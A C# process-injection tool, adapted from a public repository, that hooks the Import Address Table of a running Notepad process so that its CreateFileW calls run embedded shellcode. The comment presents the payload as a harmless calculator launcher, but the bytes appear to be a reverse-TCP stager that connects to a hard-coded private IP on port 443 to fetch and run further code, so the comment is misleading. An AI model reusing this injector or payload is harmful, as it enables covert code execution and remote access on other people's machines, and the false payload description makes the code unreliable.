//original code - https://github.com/pwndizzle/c-sharp-memory-injection/blob/master/iat-injection.cs

using System.Runtime.InteropServices;
using System;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace IAT_Hooking_Injector
{
    internal class Program
    {
        internal struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        internal struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [Flags]
        internal enum DataSectionFlags : uint
        {

            Stub = 0x00000000,

        }

        internal static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }

        internal static bool Is32BitHeader(IMAGE_FILE_HEADER fileHeader)
        {
            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & fileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }


        // Process privileges
        internal const int PROCESS_CREATE_THREAD = 0x0002;
        internal const int PROCESS_QUERY_INFORMATION = 0x0400;
        internal const int PROCESS_VM_OPERATION = 0x0008;
        internal const int PROCESS_VM_WRITE = 0x0020;
        internal const int PROCESS_VM_READ = 0x0010;
        internal const int PROCESS_ALL_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

        // Memory permissions
        internal const uint MEM_COMMIT = 0x00001000;
        internal const uint MEM_RESERVE = 0x00002000;
        internal const uint PAGE_READWRITE = 0x04;
        internal const uint PAGE_EXECUTE_READWRITE = 0x40;


        [DllImport("kernel32.dll")]
        internal static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        internal static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        internal static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        internal static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        static void Main(string[] args)
        {
            string targetProcName = "notepad";
            string targetFuncName = "CreateFileW";

            // Get target process id and read memory contents
            Process process = Process.GetProcessesByName(targetProcName)[0];
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, process.Id);
            int bytesRead = 0;
            byte[] fileBytes = new byte[process.WorkingSet64];
            ReadProcessMemory(hProcess, process.MainModule.BaseAddress, fileBytes, fileBytes.Length, ref bytesRead);

            // The DOS header
            IMAGE_DOS_HEADER dosHeader;

            // The file header
            IMAGE_FILE_HEADER fileHeader;

            // Optional 32 bit file header 
            IMAGE_OPTIONAL_HEADER32 optionalHeader32 = new IMAGE_OPTIONAL_HEADER32();

            // Optional 64 bit file header 
            IMAGE_OPTIONAL_HEADER64 optionalHeader64 = new IMAGE_OPTIONAL_HEADER64();

            // Image Section headers
            IMAGE_SECTION_HEADER[] imageSectionHeaders;

            // Import descriptor for each DLL
            IMAGE_IMPORT_DESCRIPTOR[] importDescriptors;

            // Convert file bytes to memorystream and use reader
            MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length);
            BinaryReader reader = new BinaryReader(stream);

            //Begin parsing structures
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (Is32BitHeader(fileHeader))
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            // Go to ImportTable and parse every imported DLL
            stream.Seek((long)((ulong)optionalHeader64.ImportTable.VirtualAddress), SeekOrigin.Begin);
            importDescriptors = new IMAGE_IMPORT_DESCRIPTOR[50];

            for (int i = 0; i < 50; i++)
            {
                importDescriptors[i] = FromBinaryReader<IMAGE_IMPORT_DESCRIPTOR>(reader);
            }
            bool flag = false;
            int j = 0;

            // The below is really hacky, would have been better to use structures!
            while (j < importDescriptors.Length && !flag)
            {
                for (int k = 0; k < 1000; k++)
                {
                    // Get the address for the function and its name
                    Console.WriteLine("##############################");
                    stream.Seek(importDescriptors[j].OriginalFirstThunk + (k * 8), SeekOrigin.Begin);

                    long nameOffset = reader.ReadInt64();
                    if (nameOffset > 1000000 || nameOffset < 0)
                    {
                        break;
                    }

                    // Get the function name
                    stream.Seek(nameOffset + 2, SeekOrigin.Begin);
                    List<string> list = new List<string>();
                    byte[] array;
                    do
                    {
                        array = reader.ReadBytes(1);
                        list.Add(Encoding.Default.GetString(array));
                    }
                    while (array[0] != 0);
                    string curFuncName = string.Join(string.Empty, list.ToArray());
                    curFuncName = curFuncName.Substring(0, curFuncName.Length - 1);

                    // Get the offset of the pointer to the target function and its current value
                    long funcOffset = importDescriptors[j].FirstThunk + (k * 8);
                    stream.Seek(funcOffset, SeekOrigin.Begin);
                    long curFuncAddr = reader.ReadInt64();
                    Console.WriteLine("funcname: " + curFuncName + "  ptr: " + curFuncAddr.ToString("X"));

                    // Found target function, modify address to point to shellcode
                    if (curFuncName == targetFuncName)
                    {

                        // WinExec shellcode from: https://github.com/peterferrie/win-exec-calc-shellcode
                        // nasm w64-exec-calc-shellcode.asm -DSTACK_ALIGN=TRUE -DFUNC=TRUE -DCLEAN=TRUE -o w64-exec-calc-shellcode.bin
                        byte[] payload = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,
0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x50,0x49,0x01,0xd0,
0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,
0xc0,0xa8,0x85,0x85,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,
0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,
0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,
0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,
0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,
0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,
0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,
0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,
0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,
0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,
0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
};

                        // Once shellcode has executed go to real import (mov to rax then jmp to address)
                        byte[] mov_rax = new byte[2] {
                            0x48, 0xb8
                        };
                        byte[] jmp_address = BitConverter.GetBytes(curFuncAddr);
                        byte[] jmp_rax = new byte[2] {
                            0xff, 0xe0
                        };

                        // Build shellcode
                        byte[] shellcode = new byte[payload.Length + mov_rax.Length + jmp_address.Length + jmp_rax.Length];
                        payload.CopyTo(shellcode, 0);
                        mov_rax.CopyTo(shellcode, payload.Length);
                        jmp_address.CopyTo(shellcode, payload.Length + mov_rax.Length);
                        jmp_rax.CopyTo(shellcode, payload.Length + mov_rax.Length + jmp_address.Length);

                        // Allocate memory for shellcode
                        IntPtr shellcodeAddress = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                        // Write shellcode to memory
                        IntPtr shellcodeBytesWritten = IntPtr.Zero;
                        WriteProcessMemory(hProcess, shellcodeAddress, shellcode, shellcode.Length, out shellcodeBytesWritten);

                        long funcAddress = (long)optionalHeader64.ImageBase + funcOffset;

                        // Get current value of IAT
                        bytesRead = 0;
                        byte[] buffer1 = new byte[8];
                        ReadProcessMemory(hProcess, (IntPtr)funcAddress, buffer1, buffer1.Length, ref bytesRead);

                        // Get shellcode address
                        byte[] shellcodePtr = BitConverter.GetBytes((Int64)shellcodeAddress);

                        // Modify permissions to allow IAT modification
                        uint oldProtect = 0;
                        bool protectbool = VirtualProtectEx(hProcess, (IntPtr)funcAddress, shellcodePtr.Length, PAGE_EXECUTE_READWRITE, out oldProtect);

                        // Modfiy IAT to point to shellcode
                        IntPtr iatBytesWritten = IntPtr.Zero;
                        bool success = WriteProcessMemory(hProcess, (IntPtr)funcAddress, shellcodePtr, shellcodePtr.Length, out iatBytesWritten);

                        // Read IAT to confirm new value
                        bytesRead = 0;
                        byte[] buffer = new byte[8];
                        ReadProcessMemory(hProcess, (IntPtr)funcAddress, buffer, buffer.Length, ref bytesRead);
                        Console.WriteLine("Old IAT ptr: " + BitConverter.ToString(buffer1) + "  New IAT ptr: " + BitConverter.ToString(buffer));

                        flag = true;
                        break;
                    }
                }
                j++;
            }
        }
    }
}
